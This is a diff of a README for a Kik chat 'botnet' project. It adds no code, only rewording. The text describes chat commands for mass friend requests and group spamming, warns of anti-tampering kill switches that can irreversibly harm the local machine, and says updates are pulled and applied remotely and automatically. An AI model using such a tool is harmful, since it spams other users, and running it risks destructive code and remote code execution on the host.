@@ -3,7 +3,7 @@ This is a Kik botnet that uses the [Tomer8007 Kik Bot API](https://github.com/to
 
 You need to get an [access key](https://stethospasm.weebly.com/pricing.html) to be able to use this botnet, you can get one for free!
 
-Read the [disclaimers](https://stethospasm.weebly.com/disclaimers.html) prior to running this code, as it contains anti-tampering kill switches that can cause **irreversible harm** to a local machine if triggered!
+Read the [disclaimers](https://stethospasm.weebly.com/disclaimers.html) prior to running this code, as it contains anti-tampering kill switches that can cause **irreversible harm** to a local machine if triggered.
 
 # Installation
 
@@ -11,9 +11,7 @@ Make sure you are using Python 3.6+, not python 2.7!
 
 Use `git clone https://github.com/StethoSaysHello/KikBotnet`
 
-Then just run [main.py](https://github.com/StethoSaysHello/KikBotnet/blob/main/main.py).
-
-It will install all of the needed dependancies and modules for you. All updates to the botnet will be applied remotley, it's all automatic!
+Then just run [main.py](https://github.com/StethoSaysHello/KikBotnet/blob/main/main.py), it will install all of the needed dependancies and modules for you. All updates to the botnet will be applied remotley, it's all automatic!
 
 # Usage
 
@@ -29,7 +27,7 @@ You cannot trigger the botnet from the terminal, you need to trigger the bots th
 
 **"SendFriend [JID or Username]"** - Used to send a friend attribution request to a user.
 
-**"GroupSpam [Message]"** - Used to spam the group a bot is in with a message.
+**"GroupSpam [Message]"** - Used to spam the group that this command is used in.
 
-**"Leave [GJID]"** - Used for leaving groups.
+**"Leave [GJID]"** - Used for making your bot(s) leave groups.
 
